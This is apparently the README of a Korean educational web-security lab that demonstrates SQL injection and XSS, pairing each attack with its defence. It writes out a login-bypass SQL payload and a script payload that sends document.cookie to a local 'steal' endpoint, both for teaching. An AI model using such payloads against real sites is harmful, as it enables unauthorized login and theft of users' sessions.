# 🔐 웹 보안 학습 플랫폼 - 프론트엔드

**React + TypeScript + Vite 기반의 교육용 웹 보안 플랫폼 프론트엔드**

## 📋 프로젝트 개요

이 프로젝트는 **웹 취약점을 안전하게 체험하고 방어 방법을 학습**하기 위한 교육용 플랫폼입니다.

### 🎯 학습 모듈

| 모듈 | 설명 | 포트 |
|------|------|------|
| **SQL Injection** | 데이터베이스 쿼리 조작 공격 실습 | 5173 (프론트) / 5001 (백) |
| **XSS** | 크로스사이트 스크립팅 공격 실습 | 5173 (프론트) / 5001 (백) |

---

## 🚀 시작하기

### 전제 요구사항

- Node.js 18+ 
- npm 또는 yarn
- Python 3.8+ (백엔드)
- Docker & Docker Compose (선택사항)

### 방법 1: 프론트엔드만 실행 (권장)

```bash
# 프론트엔드 설치
cd frontend
npm install

# 개발 서버 실행
npm run dev
```

브라우저에서 **http://localhost:5173** 접속

### 방법 2: 전체 프로젝트 실행 (Docker)

```bash
# 프로젝트 루트에서
docker-compose up --build

# 접속 주소
# 프론트엔드: http://localhost:5173
# 백엔드 API: http://localhost:5001
```

### 방법 3: 백엔드 직접 실행

```bash
# 백엔드 설치
cd test
pip install -r requirements.txt

# 백엔드 실행
python app.py
```

---

## 📁 프로젝트 구조

```
frontend/
├── src/
│   ├── pages/
│   │   ├── HomePage.tsx          # 메인 페이지
│   │   ├── HomePage.css
│   │   ├── LoginPage.tsx         # SQL Injection 실습
│   │   ├── LoginPage.css
│   │   ├── BoardPage.tsx         # XSS 실습
│   │   └── BoardPage.css
│   ├── api/
│   │   └── client.ts             # API 클라이언트 (axios)
│   ├── App.tsx                   # 라우팅 설정
│   ├── App.css
│   ├── index.css                 # 전역 스타일
│   └── main.tsx                  # 엔트리 포인트
├── index.html
├── package.json
├── tsconfig.json
├── vite.config.ts
└── README.md
```

---

## 🛠️ 기술 스택

### 프론트엔드
- **React 19** - UI 라이브러리
- **TypeScript** - 타입 안전성
- **Vite** - 빠른 빌드 도구
- **React Router** - 페이지 라우팅
- **Axios** - HTTP 클라이언트
- **CSS3** - 모던 스타일링

### 백엔드
- **Python Flask** - 웹 프레임워크
- **SQLite3** - 데이터베이스
- **Flask-CORS** - CORS 처리

---

## 🎓 학습 모듈 사용 방법

### 1️⃣ SQL Injection (로그인 페이지)

**경로**: `http://localhost:5173/login`

#### 공격 시뮬레이션
```
아이디: ' OR '1'='1' --
비밀번호: (아무거나)
```

#### 작동 원리
```sql
-- 정상 쿼리
SELECT * FROM users WHERE username='admin' AND password='1234'

-- 공격 후 실행되는 쿼리
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
-- '1'='1'은 항상 참이므로 모든 회원 정보 반환!
```

#### 방어 방법
```python
# ❌ 취약한 코드
query = f"SELECT * FROM users WHERE username='{username}'"

# ✅ 안전한 코드 - 파라미터 바인딩 사용
query = "SELECT * FROM users WHERE username=?"
db.execute(query, [username])
```

---

### 2️⃣ XSS (게시판)

**경로**: `http://localhost:5173/board`

#### 공격 시뮬레이션
```
이름: 해커
내용:
<script>
  alert('XSS 공격 성공!');
  fetch('http://localhost:5001/steal?cookie=' + 
    encodeURIComponent(document.cookie))
</script>
```

#### 작동 원리
1. 공격자가 JavaScript 코드를 포함한 게시물 등록
2. 다른 사용자가 게시판 접속 → 브라우저가 스크립트 자동 실행
3. 쿠키, 세션 정보, 개인 데이터 유출

#### 방어 방법
```javascript
// ❌ 취약한 코드 (Flask)
posts_html = ''.join([f"<div>{p[1]}</div>" for p in posts])

// ✅ 안전한 코드 (React - 자동 이스케이프)
<div>{userInput}</div>

// ✅ DOMPurify 라이브러리 사용
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(html)}} />

// ✅ CSP 헤더 설정
Content-Security-Policy: script-src 'self'
```

---

## 🔧 개발 명령어

```bash
# 개발 서버 실행
npm run dev

# 프로덕션 빌드
npm run build

# 빌드 결과 미리보기
npm run preview

# Lint 확인
npm run lint
```

---

## 🌐 백엔드 API 문서

### SQL Injection 엔드포인트
```
GET /login?username={username}&password={password}
```

**응답 예시**:
```json
{
  "status": "success",
  "leaked_data": [
    {
      "username": "admin",
      "phone": "010-1234-5678",
      "email": "admin@naver.com"
    },
    {
      "username": "taehoon",
      "phone": "010-5876-5432",
      "email": "taehoon@gmail.com"
    }
  ]
}
```

### XSS 엔드포인트
```
GET  /board              # 게시물 조회
POST /board              # 게시물 등록
Content-Type: application/x-www-form-urlencoded
body: name=이름&content=내용
```

---

## 🎨 UI/UX 특징

✨ **현대적 다크 테마**
- 눈 편한이고 전문적인 인터페이스
- 그라데이션과 그림자 효과로 깊이감 표현

📱 **반응형 디자인**
- 모바일, 태블릿, 데스크톱 모두 지원
- CSS Grid와 Flexbox로 유연한 레이아웃

📚 **교육 중심 설계**
- 각 페이지에 공격 방법과 방어 방법 통합
- 대화형 설명으로 개념 쉽게 이해
- 실시간 공격 결과 확인

---

## ⚠️ 중요 안내

### 법적 책임

이 플랫폼은 **교육 목적**으로만 사용 가능합니다.

✅ **할 수 있는 것**
- 자신의 개발 환경에서 테스트
- 웹 보안 개념 학습
- 팀 내 보안 교육

❌ **하면 안 되는 것**
- 다른 사람의 서버/시스템 공격
- 무단 접근 및 데이터 도용
- 법적 승인 없는 보안 테스트

**위반 시 불정 접근금지법 등으로 처벌받을 수 있습니다!**

---

## 🐛 트러블슈팅

### Q: "포트 5173이 이미 사용 중입니다" 오류
```bash
# 다른 포트에서 실행
npm run dev -- --port 3000
```

### Q: CORS 오류 발생
```
Access to XMLHttpRequest blocked by CORS policy
```
**해결**: 백엔드가 실행 중인지 확인
```bash
cd test
python app.py
# 또는 Docker: docker-compose up
```

### Q: API 호출이 실패합니다
- 백엔드 주소를 확인: `http://localhost:5001`
- API 클라이언트 설정 확인: `src/api/client.ts`

---

## 📚 추가 학습 자료

### OWASP 리소스
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [SQL Injection 방어](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [XSS 방어](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### 온라인 교육
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

## 📝 라이선스

교육 목적 공개 프로젝트

---

## 🎯 핵심 정리

| 취약점 | 원인 | 공격 | 방어 |
|--------|------|------|------|
| **SQL Injection** | 입력값 미검증 | `' OR '1'='1' --` | 파라미터 바인딩 |
| **XSS** | HTML 이스케이프 미처리 | `<script>alert(1)</script>` | 입력 검증 + 이스케이프 |

**"웹 보안은 선택이 아닌 필수입니다!"** 🛡️

---

**Happy Learning! 🚀**
